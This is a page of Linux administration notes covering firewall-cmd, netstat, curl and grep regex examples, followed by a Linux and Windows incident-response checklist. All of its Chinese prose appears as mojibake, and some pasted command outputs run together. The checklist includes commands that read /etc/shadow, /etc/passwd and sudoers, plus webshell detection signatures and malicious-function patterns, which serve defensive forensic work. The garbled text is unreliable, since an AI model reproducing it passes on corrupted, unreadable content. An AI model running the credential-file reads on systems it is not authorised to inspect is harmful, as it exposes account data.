æŸ¥çœ‹æ‰€æœ‰æ‰“å¼€çš„ç«¯å£ï¼š firewall-cmdâ€“zone=public --list-ports
æ‰“å¼€ç«¯å£ï¼šfirewall-cmd --zone=public --add-port=80/tcp --permanent
é‡æ–°è½½å…¥ï¼šfirewall-cmd --reload
åˆ é™¤ï¼šfirewall-cmd --zone=public --remove-port=80/tcp --permanent
```

`firewall-cmd --zone=public --list-ports` å‘½ä»¤åªä¼šæ˜¾ç¤ºåœ¨é˜²ç«å¢™è§„åˆ™ä¸­æ‰‹åŠ¨æ·»åŠ çš„ç«¯å£ï¼Œä¸ä¼šæ˜¾ç¤ºå·²ç»è¢«å ç”¨çš„ç«¯å£ã€‚

å¦‚æœæƒ³è¦æŸ¥çœ‹æ‰€æœ‰å·²ç»è¢«å ç”¨çš„ç«¯å£å’Œå¯¹åº”çš„è¿›ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ `netstat` å‘½ä»¤ã€‚ä¾‹å¦‚ï¼š

```
netstat -tlnp
```

è¯¥å‘½ä»¤å°†åˆ—å‡ºæ‰€æœ‰å½“å‰æ­£åœ¨è¿è¡Œçš„TCPç«¯å£å’Œè¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ¬åœ°IPåœ°å€ã€ç«¯å£ã€è¿œç¨‹IPåœ°å€ã€è¿œç¨‹ç«¯å£å’Œæ‰€å±è¿›ç¨‹çš„åç§°ã€‚











## curlå‘½ä»¤

### 1ã€å‘é€GETè¯·æ±‚

```bash
curl URL
curl URL?a=1&b=nihao
```

### 2ã€å‘é€POSTè¯·æ±‚

```bash
curl -X POST -d 'a=1&b=nihao' URL
```

### 3ã€å‘é€jsonæ ¼å¼è¯·æ±‚ï¼š

```bash
curl -H "Content-Type: application/json" -X POST -d '{"abc":123,"bcd":"nihao"}' URL
curl -H "Content-Type: application/json" -X POST -d @test.json URL
```

å…¶ä¸­ï¼Œ**-H**ä»£è¡¨headerå¤´ï¼Œ**-X**æ˜¯æŒ‡å®šä»€ä¹ˆç±»å‹è¯·æ±‚(POST/GET/HEAD/DELETE/PUT/PATCH)ï¼Œ**-d**ä»£è¡¨ä¼ è¾“ä»€ä¹ˆæ•°æ®ã€‚è¿™å‡ ä¸ªæ˜¯æœ€å¸¸ç”¨çš„ã€‚

æŸ¥çœ‹æ‰€æœ‰curlå‘½ä»¤ï¼š man curlæˆ–è€…curl -h
è¯·æ±‚å¤´ï¼šH,A,e
å“åº”å¤´ï¼šI,i,D
cookieï¼šb,c,j
ä¼ è¾“ï¼šF(POST),G(GET),T(PUT),X
è¾“å‡ºï¼šo,O,w
æ–­ç‚¹ç»­ä¼ ï¼šr
è°ƒè¯•ï¼šv,--trace,--trace-ascii,--trace-time



## grep

### ç”±æ™®é€šå­—ç¬¦å’Œæ­£åˆ™è¡¨è¾¾å¼çš„å…ƒå­—ç¬¦ç»„æ„æˆçš„æ¡ä»¶

**ç®€å•ä¾‹å­**

```
grep "root" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123204009457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### æ­£åˆ™è¡¨è¾¾å¼çš„å…ƒå­—ç¬¦

### ï¼ˆ1ï¼‰åŒ¹é…å•ä¸ªå­—ç¬¦çš„å…ƒå­—ç¬¦

**. ä»»æ„å•ä¸ªå­—ç¬¦ï¼ˆå‰é¢æ˜¯ä¸€ä¸ªå°ç‚¹ï¼‰**

```
grep "r..t" /etc/passwd
```

 **æ³¨æ„ï¼š.  ä»£è¡¨ä»»æ„å­—ç¬¦ï¼Œæ­¤å¤„æœ‰ä¸¤ä¸ª . ï¼Œä»£è¡¨ä¸¤ä¸ªä»»æ„å­—ç¬¦ï¼Œçœ‹ä¸‹é¢çš„ä¾‹å­**

![img](https://img-blog.csdnimg.cn/20190123204437689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

 **[ ]  ä»£è¡¨æˆ–è€…çš„å…³ç³»**

 **è¿ç»­çš„å­—ç¬¦èŒƒå›´**

**[a-z] : aåˆ°zçš„æ‰€æœ‰å°å†™å­—æ¯**

**[A-Z]  ï¼š Aåˆ°Zæ‰€æœ‰çš„å¤§å†™å­—æ¯**

**[a-zA-Z] ï¼šåŒ…å«æ‰€æœ‰çš„å¤§å°å†™å­—æ¯** 

**[0-9] ï¼š0åˆ°9çš„æ‰€æœ‰æ•°å­—**

**[a-zA-Z0-9 ] ï¼šåŒ…å«æ‰€æœ‰å¤§å°å­—æ¯å’Œæ•°å­—**

### ä¸ºäº†æ–¹ä¾¿åé¢çš„ç»ƒä¹ ï¼Œåœ¨æ­¤å»ºç«‹ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œå†™å…¥å­—ç¬¦ï¼Œå½“åšç»ƒä¹ çš„æ–‡ä»¶

```
vim 1.txt
rot
rAt
rBt
r1t
root
rVCt
r4t
grep "r[a-z]t" 1.txtgrep "r[A-Z]t" 1.txt
```

![img](https://img-blog.csdnimg.cn/20190123210234548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

**^ å–å**

**[^a-z]**

```
grep "r[^0-9]t" 1.txt
```

![img](https://img-blog.csdnimg.cn/20190123210505532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### (2)åŒ¹é…å­—ç¬¦å‡ºç°çš„ä½ç½®

**^string ä»¥stringå¼€å¤´**

```
 grep "^root" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/2019012321070646.png)

**å¯¹é¦–è¡Œ[rbh]å¼€å¤´**

```
grep "^[rbh]" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123210831400.png)

**ä¸æ˜¯ã€rbhã€‘å¼€å¤´**

```
grep "^[^rbh]" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123210928496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

**string$ ä»¥string$ç»“å°¾**

**ä»¥bashç»“å°¾çš„**

```
 grep "bash$" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123211047362.png)

**æŸ¥çœ‹nologinçš„è¡Œæ•°**

```
grep "nologin$" /etc/passwd | wc -l
```

![img](https://img-blog.csdnimg.cn/20190123211230787.png)

**^$ ï¼š ä»£è¡¨ ç©ºè¡Œ**

**æŸ¥çœ‹ç›®å½•åç§°ï¼ˆæ­¤å¤„æ˜¯æŒ‡ç›®å½•æ–‡ä»¶ï¼‰**

```
ls -l /etc/ | grep "^d"
```

![img](https://img-blog.csdnimg.cn/20190123211622848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### ä¸ºäº†æ–¹ä¾¿åé¢çš„ç»ƒä¹ ï¼Œåœ¨æ­¤å»ºç«‹ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œå†™å…¥å­—ç¬¦ï¼Œå½“åšç»ƒä¹ çš„æ–‡ä»¶

```
vim 2.txt
a
ab
abb
abbbb
abbbbb
abbbbbbb
```

### *** åŒ¹é…å…¶å‰ä¸€ä¸ªå­—ç¬¦å‡ºç°ä»»æ„æ¬¡**

###  **.\*ä»»æ„å­—ç¬¦**

```
 grep "ab*" 3.txt
```

![img](https://img-blog.csdnimg.cn/20190123211950512.png)

### \?  0æ¬¡æˆ–è€…1æ¬¡  å¯æœ‰å¯æ— 

```
grep "ab\?" 2.txt
```

![img](https://img-blog.csdnimg.cn/20190123212046669.png)

### \+ 1æ¬¡æˆ–è€…å¤šæ¬¡  æœ€å°‘1æ¬¡

```
grep "ab\+" 2.txt
```

### ![img](https://img-blog.csdnimg.cn/20190123212225265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### \{2\}  å‡ºç°ä¸¤æ¬¡

```
grep "ab\{2\}" 2.txt
```

### ![img](https://img-blog.csdnimg.cn/20190123212324847.png)

### \{2ï¼Œ5\}  æœ€å°‘2æ¬¡ï¼Œæœ€å¤š5æ¬¡

```
grep "ab\{2,5\}" 2.txt
```

![img](https://img-blog.csdnimg.cn/20190123212425325.png)

# optioné€‰é¡¹

## 1ï¼‰-i å¿½ç•¥å¤§å°å†™

```
[root@zhang ~]# grep -i "^r" 1.txt
```

## 2ï¼‰-o ä»…æ˜¾ç¤ºç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å†…å®¹ï¼Œä¸æ˜¾ç¤ºæ•´è¡Œ

```
[root@zhang ~]# grep -o  "r..t" /etc/passwdroot
```

## 3ï¼‰-v åå‘è¿‡æ»¤

```
[root@zhang ~]# grep -v "^#" /etc/fstab/dev/mapper/centos-root /                       xfs     defaults        0 0UUID=20b4a09c-ba00-41d4-a6d5-7dc24bc0a057 /boot                   xfs     defaults        0 0/dev/mapper/centos-swap swap                    swap    defaults        0 0
```

## 4ï¼‰-e æ ¹æ®å¤šæ¡ä»¶è¿‡æ»¤æ–‡ä»¶

```
[root@zhang ~]# grep -e "^$" -e "^#" /etc/fstab## /etc/fstab# Created by anaconda on Mon Jan  7 01:19:06 2019
```

## 4ï¼‰-E æ”¯æŒæ‰©å±•æ­£åˆ™è¡¨è¾¾å¼

```
grep -E "vmx|svm" /proc/cpuinfo
```

## 5ï¼‰-A n æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„å2è¡Œ

```
[root@zhang ~]# ifconfig |grep -A 2 "netmask"        inet 192.168.196.131  netmask 255.255.255.0  broadcast 192.168.196.255        inet6 fe80::20c:29ff:fe8e:e21b  prefixlen 64  scopeid 0x20<link>        ether 00:0c:29:8e:e2:1b  txqueuelen 1000  (Ethernet)--        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10<host>        loop  txqueuelen 1000  (Local Loopback)
```

## 6ï¼‰-B n æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„å‰2è¡Œ

```
[root@zhang ~]# ifconfig |grep -B 2 "netmask"ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500        inet 192.168.196.131  netmask 255.255.255.0  broadcast 192.168.196.255--lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0
```































# åº”æ€¥å“åº”

## **å¼•å­ï¼š**

 æœ€è¿‘åšäº†ä¸€äº›åº”æ€¥å“åº”ï¼Œåœ¨å“åº”çš„æ—¶å€™ä¹Ÿç¿»æŸ¥äº†ä¸å°‘èµ„æ–™ï¼Œå‘ç°å¤§éƒ¨åˆ†éƒ½æ˜¯æŒ‰ç…§æ”»å‡»æ¥åˆ†ç±»è¿›è¡Œå“åº”å·¥ä½œï¼›å¯»æ‘¸ç€èƒ½ä¸èƒ½æœ‰ä¸ªä¸€æ¡é¾™çš„çº¿è·¯å»è¿›è¡Œåº”æ€¥å“åº”(æ¯•ç«Ÿæ–°æ‰‹ï¼Œå€æ„Ÿå‹åŠ›)ï¼Œ

äºæ˜¯ç²—ç•¥çš„æ•´ç†äº†ä¸‹ï¼›æœŸé—´ç¿»çœ‹äº†å¾ˆå¤šæ–‡ç« ï¼ŒæŠŠæˆ‘è®¤ä¸ºå¯èƒ½ç”¨åˆ°çš„ä¸œè¥¿å¼•å¯¼åˆ°äº†æ€»ç»“ä¹‹ä¸­ï¼Œæ‰€ä»¥æœ¬æ–‡ä»…ä¸ºæ€»ç»“ï¼Œéå…¨éƒ¨åŸåˆ›ï¼Œéš¾å…è°¬è¯¯ä¹‹å¤„ï¼Œè¯·å¤§å®¶æ–§æ­£ï¼Œæ±‚å¤§ä½¬ä»¬æ‰‹å£ç•™æƒ… (é¦–å‘çŒæˆ·æ”»é˜²å®éªŒå®¤)

![1657874900_62d129d4563156affee5c.png!small?1657874900918](https://image.3001.net/images/20220715/1657874900_62d129d4563156affee5c.png!small?1657874900918)

## ç›®å½•

1ã€äº‹ä»¶å‘ç°
2ã€èµ„äº§ä¿¡æ¯æƒ…å†µæŒæ¡
3ã€å¤‡ä»½ä¿æŠ¤
4ã€é˜»æ–­éš”ç¦»
5ã€äº‹ä»¶ç ”åˆ¤
6ã€æ¶æ„æ–‡ä»¶ç­‰å¤„ç†
7ã€ç ”åˆ¤ç»“æœ
8ã€å¤„ç½®å»ºè®®
9ã€é™„å½•ï¼šå¸¸ç”¨å·¥å…·ã€ååˆ¶ã€è§„èŒƒæŒ‡å—ç­‰

## ä¸€ã€äº‹ä»¶å‘ç°

å…³äºäº‹ä»¶çš„å‘ç°ï¼Œé€šå¸¸æ¥æºäºï¼š

### 1.å®‰å…¨è®¾å¤‡

æ‰«æIP ã€å¨èƒé˜»æ–­ã€ æ—¥å¿—å®¡è®¡ã€ ç—…æ¯’æœ¨é©¬ã€ å…¥ä¾µäº‹ä»¶ã€ å¼‚å¸¸æµé‡ã€ æš´åŠ›ç ´è§£ç­‰

### 2.å†…/å¤–éƒ¨é€šæŠ¥

å¦‚CNNVD/å„SRC/HWè£åˆ¤ç»„ç­‰é€šæŠ¥ä¿¡æ¯

### 3.èœœç½æ•è·

æ”»å‡»è¡Œä¸ºã€ æ”»å‡»è€…ç”»åƒ

### 4.é’“é±¼ç›‘æ§

- æ¶æ„æ ·æœ¬
- æ¶æ„URL
- æ¶æ„é‚®ä»¶

ï¼ˆ é’ˆå¯¹æ¶æ„é‚®ä»¶ï¼Œå¯æŸ¥çœ‹é‚®ä»¶åŸæ–‡ï¼ŒæŸ¥çœ‹å‘ä»¶äººçš„IPåœ°å€ï¼› X-Originating-IPå³ä¸ºå‘ä»¶äººipåœ°å€ã€‚ï¼‰

### 5.å…¶ä»–æ¸ é“æ¶ˆæ¯æ¥æº

å¦‚QQ/å¾®ä¿¡ç¾¤æˆ–å…¶ä»–å¦‚æš—ç½‘ä¿¡æ¯ç­‰



## äºŒã€äº†è§£æ¶‰äº‹èµ„äº§éƒ¨ç½²æƒ…å†µ

### 1.éƒ¨ç½²æ—¶é—´

äº†è§£èµ„äº§éƒ¨ç½²æ—¶é—´ï¼Œå¯åœ¨åæœŸæ¨æ–­æ—¥å¿—ä¿¡æ¯ï¼Œç»™äºˆæœ‰åˆ©å¸®åŠ©

### 2.æŒ‚è½½åº”ç”¨

- åº”ç”¨æ¶æ„
- æœåŠ¡ã€åŠŸèƒ½ï¼ˆä¸Šä¼ åŠŸèƒ½ï¼ŸSQLè¯­å¥ç»´æŠ¤åŠŸèƒ½ï¼Ÿï¼‰
- æ˜¯å¦å­˜åœ¨ç¬¬ä¸‰æ¥å£
- æ˜¯å¦å­˜åœ¨ç¬¬ä¸‰æ–¹å¹³å°



### 3.ç«¯å£ã€æœåŠ¡

å¼€æ”¾çš„è®¿é—®ç«¯å£ï¼Œéƒ¨ç½²çš„å“ªäº›æœåŠ¡

### 4.ä¸šåŠ¡å†…å®¹

ä¸šåŠ¡å†…å®¹æ˜¯å¦æ•æ„Ÿï¼Œæ ¸å¿ƒä¸šåŠ¡è¿˜æ˜¯è¾¹ç¼˜ä¸šåŠ¡ï¼Œä¸šåŠ¡ä½¿ç”¨å¯¹è±¡æ˜¯å†…éƒ¨è¿˜æ˜¯å¤–éƒ¨ï¼Œæ˜¯å¦æ¶‰åŠæ•æ„Ÿæ•°æ®ç­‰

### 5.æ˜¯å¦å¼€æ”¾å…¬ç½‘è®¿é—®

ä»…å†…ç½‘è®¿é—®è¿˜æ˜¯å¯¹å¤–å¼€æ”¾ï¼Œç¡®è®¤åº”æ€¥èŒƒå›´

### 6.æ˜¯å¦å­˜åœ¨é€šç”¨å¯†ç ã€å¼±å£ä»¤

### 7.æ˜¯å¦æœ‰ç»´æŠ¤å‚å•†

### 8.æ˜¯å¦çº³å…¥å®‰å…¨é˜²æŠ¤è¾–åŒº

### 9.å†å²æ¼æ´æƒ…å†µ

é€šè¿‡å†å²æ¼æ´æƒ…å†µæŒæ¡ç³»ç»Ÿå¯é æ€§ï¼Œå¹¶ç¡®è®¤æ¼æ´æ˜¯å¦ä¿®å¤

### 10.æ˜¯å¦æœ‰å®šæœŸè¿›è¡Œå®‰å…¨æ‰«æ

### 11.æ˜¯å¦è¿‘æœŸæœ‰æ—¥å¸¸ç»´æŠ¤ã€å®‰å…¨ç»´æŠ¤

### 12.æ˜¯å¦å®‰è£…é˜²æŠ¤è½¯ä»¶ï¼Œè½¯ä»¶æ˜¯å¦å‡çº§

### 13.æ˜¯å¦é’ˆå¯¹çƒ­é—¨æ¼æ´å‡çº§è¡¥ä¸æˆ–ä¿®å¤

## æ¶‰äº‹èµ„äº§æ‰€å±éƒ¨é—¨

ç¡®è®¤èµ„äº§å½’å±éƒ¨é—¨ï¼Œæ–¹ä¾¿æƒ…å†µäº†è§£åŠæ²Ÿé€š

## ä¸‰ã€å¤‡ä»½ä¿æŠ¤

### 1.ç³»ç»Ÿé•œåƒ/å¿«ç…§

æ˜¯å¦è™šæœºæˆ–äº‘æœºï¼Œå¯å…ˆé•œåƒæˆ–å¿«ç…§å¤‡ä»½ï¼Œä¿ç•™æ¶‰äº‹èµ„äº§é•œåƒ

### 2.åº”ç”¨ç¨‹åºå¤‡ä»½

å¯¹åº”ç”¨ç¨‹åºæ•´ä½“å¤‡ä»½ï¼Œé¿å…æ¶‰äº‹ç¯å¢ƒç ´å

### 3.æ•°æ®åº“å¤‡ä»½

å¯¹æ•°æ®åº“æ•´ä½“å¤‡ä»½ï¼Œé¿å…æ¶‰äº‹ç¯å¢ƒç ´å

### 4.åæœŸæ’æŸ¥ä¸­å‘ç°çš„å¯ç–‘æ–‡ä»¶å¤‡ä»½

å¤‡ä»½å¯ç–‘æ–‡ä»¶å¯ä¸ºæº¯æºç­‰è¡Œä¸ºåšä¿¡æ¯æ”¯æ’‘

## å››ã€é˜»æ–­éš”ç¦»å¤„ç†

### ä¸šåŠ¡ä¸‹çº¿

æœ‰ä¸‹çº¿æ¡ä»¶çš„åŠæ—¶è¿›è¡Œä¸šåŠ¡ä¸‹çº¿ï¼ŒåŠæ—¶æ­¢æŸï¼›

### ç½‘ç»œéš”ç¦»é˜»æ–­

åŠæ—¶å¯¹ä¸šåŠ¡èµ„äº§è¿›è¡Œç½‘ç»œé˜»æ–­éš”ç¦»ï¼›

### è¿›ç¨‹é˜»æ–­

å¯¹å‘ç°çš„æ¶æ„è¿›ç¨‹ç­‰åŠæ—¶é˜»æ–­

## äº”ã€äº‹ä»¶ç ”åˆ¤

### 5.1 Linuxç¯‡

ä¸ºé¿å…é—æ¼ï¼Œé€šè¿‡ä»¥ä¸‹å‡ ä¸ªæ–¹é¢è¿›è¡Œç ”åˆ¤ï¼š

### 5.1.1 history

é€šè¿‡æ‰§è¡Œ

> history

æˆ–

> cat /root/.bash_history

å‘½ä»¤ï¼Œè·å–å†å²æ“ä½œè®°å½•ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰æ‰§è¡Œå¯ç–‘å‘½ä»¤

### 5.1.2 ç½‘ç»œè¿æ¥ï¼ˆç«¯å£ï¼‰

é€šè¿‡å‘½ä»¤æŸ¥çœ‹ç½‘ç»œè¿æ¥åŠç«¯å£è¿æ¥ï¼š

> netstat -anltp

### 5.1.3è¿›ç¨‹

å¸¸ç”¨å‘½ä»¤ï¼š

> ps -ef
>
> ps -aux

æŸ¥çœ‹è¿›ç¨‹å¯¹åº”pidï¼š

> pgrep -l httpd

æŸ¥çœ‹pidå¯¹åº”è¿›ç¨‹ï¼š

> ls -ll /proc/{PID}

æˆ–

> file /proc/{PID}/exe

è¿›ç¨‹åˆ†æï¼š

> lsof -p {PID}

æŸ¥çœ‹è¿›ç¨‹å¯åŠ¨æ—¶é—´ï¼š

> ps -p 7224 -o lstart

æŸ¥çœ‹æœ‰æ²¡æœ‰å¯ç–‘è¿›ç¨‹

> ps -aef | grep inetd (æ³¨ï¼šinetd ç¨‹åºæ˜¯ä¸€ä¸ªLinuxå®ˆæŠ¤è¿›ç¨‹)

æ£€æµ‹éšè—è¿›ç¨‹ï¼š

> ps -ef | awk '{print}' | sort -n |uniq >1

å‚è€ƒï¼šhttp://cn-sec.com/archives/974710.html

### 5.1.4 æ–‡ä»¶ï¼š

\1. æŸ¥çœ‹æ–‡ä»¶æ—¶æ³¨æ„æŸ¥çœ‹éšè—æ–‡ä»¶ï¼Œå¦‚â€œ..â€å¼€å¤´çš„æ–‡ä»¶å¤¹

> ls -lat

2.æŸ¥çœ‹24å°æ—¶å†…ä¿®æ”¹çš„æ–‡ä»¶

> find ./ -mtime 0 -name "*.jsp"

\3. æŸ¥çœ‹24å°æ—¶å†…åˆ›å»ºçš„æ–‡ä»¶

> find ./ -ctime 0 -name "*.jsp"

\4. æŸ¥çœ‹æ–‡ä»¶è¯¦æƒ…ï¼š

statå‘½ä»¤

> stat

ç¡®è®¤ç³»ç»Ÿæ–‡ä»¶æ˜¯å¦è¢«æ›¿æ¢ï¼Œå¦‚findã€wgetç­‰ æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯

\5. é‡åˆ°æ— æ³•æŸ¥çœ‹çš„æ–‡ä»¶

> lsattr æ–‡ä»¶å/æ–‡ä»¶å¤¹



> chattr -i

\6. webshellæ–‡ä»¶æŸ¥æ‰¾

ï¼ˆ1ï¼‰webshellç‰¹å¾

> Darkbladeï¼šgoaction=login
>
> JspSpyï¼šo=login
>
> PhpSpyï¼šaction=phpinfo
>
> Regeorgï¼šcmd=connect
>
> Otherï¼šcmd=

ï¼ˆ2ï¼‰æ¶æ„å‡½æ•°ç‰¹å¾

> PHPï¼ševal(ã€system(ã€assert(
>
> JSPï¼šgetRunTime(ã€ FileOutputStream(
>
> ASPï¼ševal(ã€execute(ã€ ExecuteGlobalï¼ˆ

\7. åé—¨æ–‡ä»¶

ï¼ˆ1ï¼‰webshell

ï¼ˆ2ï¼‰åº”ç”¨ç¨‹åº

å¦‚pythonæ‰“åŒ…æ–‡ä»¶ï¼š

> python3 pyinstxtractor.py *.exe

### 5.1.5 æ—¥å¿—æ–‡ä»¶

\1. åº”ç”¨ç³»ç»Ÿæ—¥å¿—

ï¼ˆ1ï¼‰ä¸­é—´ä»¶æ—¥å¿—

> tomcat
>
> nginx
>
> apache
>
> å…¶ä»–â€¦â€¦

ï¼ˆ2ï¼‰åº”ç”¨ç³»ç»Ÿæ—¥å¿—

\2. å®‰å…¨è®¾å¤‡æ—¥å¿—

\3. æ“ä½œç³»ç»Ÿæ—¥å¿—

ä¸»è¦ç›®å½•/var/log/ï¼š

/var/log/cron  è®¡åˆ’ä»»åŠ¡

/var/log/maillog  é‚®ç®±

/var/log/message  ç³»ç»Ÿé‡è¦æ—¥å¿—

/var/log/btmp  é”™è¯¯ç™»å½•æ—¥å¿—  å‘½ä»¤ï¼šlastb

/var/log/wtmp  ç™»å½•ã€æ³¨é”€ç­‰æ—¥å¿—  å‘½ä»¤ï¼šlast

/var/log/utmp  å½“å‰å·²ç™»å½•ç”¨æˆ·æ—¥å¿—  å‘½ä»¤ï¼š whoã€ wã€  users

/var/log/lastlog  æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´  å‘½ä»¤ï¼šlastlog

### 5.1.6 å†…å­˜

ä¸»è¦å†…å­˜é©¬ç­‰ï¼Œæ£€æµ‹ï¼š

> sc javax.servlet.Servlet

### 5.1.7 åº”ç”¨éƒ¨ç½²æƒ…å†µç›¸å…³


\1. æ¡†æ¶ç»“æ„

\2. ç½‘ç»œè®¿é—®æ§åˆ¶ï¼ˆç­–ç•¥ï¼‰

\3. é€šä¿¡äº¤äº’ï¼ˆç¬¬ä¸‰æ–¹é€šä¿¡ç­‰ï¼‰

### 5.1.8 å†å²æ¼æ´

\1. å†å²æ¸—é€æŠ¥å‘Š

\2. æ¼æ‰«ç»“æœ

\3. æ˜¯å¦é€šç”¨ç¨‹åºå­˜åœ¨CVE

### 5.1.9 å…³è”èµ„äº§

ç¡®è®¤å½“å‰èµ„äº§æ‰€å…³è”çš„å…¶ä»–èµ„äº§ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š

\1. webå‰ç«¯

\2. webåå°

\3. è´Ÿè½½

\4. ä¸­é—´ä»¶

\5. æ•°æ®åº“

\6. å…¶ä»–

### 5.1.10 æ¶æ„IP

\1. IPå½’å±

\2. å¼€æ”¾ç«¯å£ï¼Œå¯¹åº”æœåŠ¡ ï¼ˆåå‘æ¸—é€æº¯æºï¼‰

\3. åœ¨çº¿æ€åŠ¿æ„ŸçŸ¥ç»“æœ

\4. æ¶æ„åŸŸåè§£ææƒ…å†µï¼šåŸŸåã€æ³¨å†Œé‚®ç®±ã€æ³¨å†Œç”µè¯ç­‰

### 5.1.11 å…¶ä»–é¡¹

**1 . å¸å·ï¼š**

ï¼ˆ1ï¼‰å¼‚å¸¸è´¦æˆ·

ï¼ˆ2ï¼‰ç‰¹æƒè´¦å·

UIDä¸º0 ï¼š

> awk -F: '$3==0{print $1}' /etc/passwd

ï¼ˆ3ï¼‰å¯è¿œç¨‹ç™»å½•çš„è´¦å·

> awk '/$1|$6/{print $1}' /etc/shadow

ï¼ˆ4ï¼‰å…¶ä»–sudoæƒé™çš„è´¦å·

> more /etc/sudoers | grep -v "^#|^$" | grep "ALL=(ALL)"

ï¼ˆ5ï¼‰æŸ¥çœ‹ç™»é™†å¤šä¹…ã€å¤šå°‘ç”¨æˆ·ï¼Œè´Ÿè½½

uptime

**2.è®¡åˆ’ä»»åŠ¡**

æŸ¥çœ‹å®šæ—¶ä»»åŠ¡

> crontab -l

å…³æ³¨ç›®å½•:

> /var/spool/cron/* 
> /etc/crontab
> /etc/cron.d/*
> /etc/cron.daily/* 
> /etc/cron.hourly/* 
> /etc/cron.monthly/*
> /etc/cron.weekly/
> /etc/anacrontab
> /var/spool/anacron/*

æ£€æŸ¥ç³»ç»Ÿå„ä¸ªç”¨æˆ·ä¸‹æ˜¯å¦å­˜åœ¨è®¡åˆ’ä»»åŠ¡

> cat /etc/passwd | cut -f 1 -d : |xargs -I {} crontab -l -u {}

**3. ç™»å½•æ—¥å¿—**

\1. ç™»å½•æˆåŠŸçš„IP

> grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

2.çˆ†ç ´ç”¨æˆ·åå­—å…¸

> grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1n";}'|uniq -c|sort -nr

ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IP

> grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'

\4. **å¯åŠ¨é¡¹**

ç›®å½•/etc/profile.d/ä¸‹çš„shellè„šæœ¬

> ls -alt /etc/profile.d/*.sh

å¯åŠ¨è„šæœ¬çš„é“¾æ¥æ–‡ä»¶

(æ ¹æ®é“¾æ¥æ–‡ä»¶çš„åå­—æ¥åˆ¤æ–­å¯åŠ¨çŠ¶æ€Kå¼€å¤´è¡¨ç¤ºä¸å¯åŠ¨æœåŠ¡ï¼ŒSæ‰“å¤´è¡¨ç¤ºå¯åŠ¨æœåŠ¡)

> ls -alt /etc/rc.d/rc{*}.d

æœåŠ¡çš„å¯åŠ¨è„šæœ¬

> ls -alt  /etc/init.d/*

å¯åŠ¨é¡¹ç›®æ£€æŸ¥

> chkconfig --list

**5. æœåŠ¡**

**6.ç¯å¢ƒå˜é‡**

> env

### 5.2 Windowsç¯‡

### 5.2.1 è´¦å·

æŸ¥çœ‹å½“å‰ç™»å½•è´¦æˆ·

> query user

æ³¨é”€ç”¨æˆ·id

> logoff {ID}

æŸ¥çœ‹ç”¨æˆ·

> net user

æŸ¥çœ‹ç”¨æˆ·ç™»å½•æƒ…å†µ

> net user username

æ£€æŸ¥Guestè´¦å·æ˜¯å¦è¢«å¯åŠ¨

æ‰“å¼€æœ¬åœ°ç”¨æˆ·ç»„

> lusrmgr.msc

æ³¨å†Œè¡¨æŸ¥çœ‹è´¦æˆ·ï¼Œç¡®è®¤ç³»ç»Ÿæ˜¯å¦å­˜åœ¨éšè—è´¦æˆ·

> HKEY_LOCAL_MACHINESAMSAMDomainsUsers\ regedit

æ£€æŸ¥å½±å­è´¦å·ï¼Œå¦‚ï¼š

> admin$

### 5.2.2 æ—¥å¿—

windows æ—¥å¿—åˆ†æï¼š

å‚è€ƒï¼šhttp://cn-sec.com/archives/1012483.html

### 5.2.3 è¿›ç¨‹

msinfo32å‘½ä»¤

> msinfo32

è·å–è¿›ç¨‹md5

> get-process | where path -ne $null | %{Get-FileHash $_.path -Algorithm md5}

æŸ¥çœ‹è¿›ç¨‹è¯¦æƒ…

> wmic process get CreationDate,name,processid,commandline,ExecutablePath /value

pidè¿›ç¨‹å¯¹åº”æœåŠ¡

> tasklist  /FI â€œpid eq {pid}â€ /svc

å…¶ä»–ï¼šProcess Explorer

### 5.2.4 ç½‘ç»œè¿æ¥

æŸ¥çœ‹ï¼š

> netstat  -ano

